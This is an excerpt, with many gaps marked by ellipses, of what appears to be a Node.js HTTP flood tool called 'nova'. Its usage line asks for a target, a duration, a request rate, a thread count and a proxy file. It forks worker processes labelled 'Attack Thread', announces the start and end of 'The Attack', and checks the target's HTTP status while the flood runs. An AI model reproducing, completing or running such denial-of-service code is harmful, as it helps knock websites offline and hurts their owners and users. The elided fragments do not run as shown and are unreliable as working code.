...
if (process.argv.length < 7){console.log(`node nova.js target time rate(32) thread proxy.txt`); process.exit();}
const headers = {};
 ...
 Promise.race([axiosPromise, timeoutPromise])
   ...
   .catch((error) => {
     if (error.message === 'Request timed out') {
       ...
       console.log(`[\x1b[35mnova\x1b[0m] ${getCurrentTime()} Title: ${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
     } else {
       console.log(`[\x1b[35mnova\x1b[0m] ${getCurrentTime()} ${error.message}`);
     }
   });
}
...
`);
 ...
 for (let i = 1; i <= process.argv[5]; i++){
   cluster.fork();
   console.log(`[\x1b[35mnova\x1b[0m] ${getCurrentTime()} Attack Thread ${i} Started`);
 }
 console.log(`[\x1b[35mnova\x1b[0m] ${getCurrentTime()} The Attack Has Started`);
 setInterval(getStatus, 2000);
 setTimeout(() => {
   console.log(`[\x1b[35mnova\x1b[0m] ${getCurrentTime()} The Attack Is Over`);
   process.exit(1);
 }, process.argv[3] * 1000);
} 
